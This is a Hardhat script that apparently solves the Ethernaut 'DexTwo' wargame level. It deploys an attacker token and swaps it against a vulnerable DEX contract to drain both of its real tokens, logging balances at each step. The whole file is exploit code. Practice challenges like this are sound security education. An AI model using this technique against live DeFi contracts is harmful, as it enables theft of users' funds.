const hre = require("hardhat");

async function main() {
  // First get victim contract
  const Victim = await ethers.getContractFactory("DexTwo");
  const victim = await Victim.attach(
    "0x98D6eacD7c5Bc681e7f8b4F1E1e89d43a09478a6" // This is the contract address that you get from starting your instance
  );

  // This is for the attacking contract
  const MyContract = await ethers.getContractFactory("DexTwoAttack");

  // Deploy contract
  const contract = await MyContract.deploy(
    "0x98D6eacD7c5Bc681e7f8b4F1E1e89d43a09478a6" // This is the contract address that you get from starting your instance
  );
  await contract.deployed();

  console.log(`Deployed contract to: ${contract.address}`);

  // Get token addresses to make it more readable
  t1 = await victim.token1();
  t2 = await victim.token2();
  t3 = contract.address;

  // Check the initial balance of token 1, 2 and 3 in the contract
  const value1 = await victim.balanceOf(t1, victim.address);
  console.log("The value of token 1 in the contract is ", value1.toString());
  const value2 = await victim.balanceOf(t2, victim.address);
  console.log("The value of token 2 in the contract is ", value2.toString());
  const evil1 = await victim.balanceOf(t3, victim.address);
  console.log("The value of token 3 in the contract is ", evil1.toString());

  // Check your initial balance of token 1, 2 and 3 in the contract
  const wallet = process.env.PUBLIC_KEY;
  const value3 = await victim.balanceOf(t1, wallet);
  console.log("Your balance of token 1 in the contract is ", value3.toString());
  const value4 = await victim.balanceOf(t2, wallet);
  console.log("Your balance of token 2 in the contract is ", value4.toString());
  const evil2 = await victim.balanceOf(t3, wallet);
  console.log("Your balance of token 3 in the contract is ", evil2.toString());

  // Approve to swap evil token for the two other tokens to drain them
  const approve2 = await contract.approve(victim.address, 300); //  we'll require exactly 300 in the end
  await approve2.wait(1);

  // Swap to drain first token, ratio is 1:1
  const attack2 = await victim.swap(t3, t1, 100);
  await attack2.wait(1);

  // Check the balance of token 1, 2 and 3 in the contract to verify ratio
  const value5 = await victim.balanceOf(t1, victim.address);
  console.log("The balance of token 1 in the contract is ", value5.toString());
  const value6 = await victim.balanceOf(t2, victim.address);
  console.log("The balance of token 2 in the contract is ", value6.toString());
  const evil3 = await victim.balanceOf(t3, victim.address);
  console.log("The balance of token 3 in the contract is ", evil3.toString());

  // Swap to drain second token, ratio is 2:1, that's why we send 200
  const attack3 = await victim.swap(t3, t2, 200);
  await attack3.wait(1);

  // Check the final balance of token 1, 2 and 3 in the contract
  const value7 = await victim.balanceOf(t1, victim.address);
  console.log("The value of token 1 in the contract is ", value7.toString());
  const value8 = await victim.balanceOf(t2, victim.address);
  console.log("The value of token 2 in the contract is ", value8.toString());
  const evil4 = await victim.balanceOf(t3, victim.address);
  console.log("The value of token 3 in the contract is ", evil4.toString());

  // Check your final balance of token 1, 2 and 3 in the contract
  const value9 = await victim.balanceOf(t1, wallet);
  console.log("Your balance of token 1 in the contract is ", value9.toString());
  const value10 = await victim.balanceOf(t2, wallet);
  console.log("Your balance of token 2 is ", value10.toString());
  const evil5 = await victim.balanceOf(t3, wallet);
  console.log("Your balance of token 3 in the contract is ", evil5.toString());
}

// Recommended pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
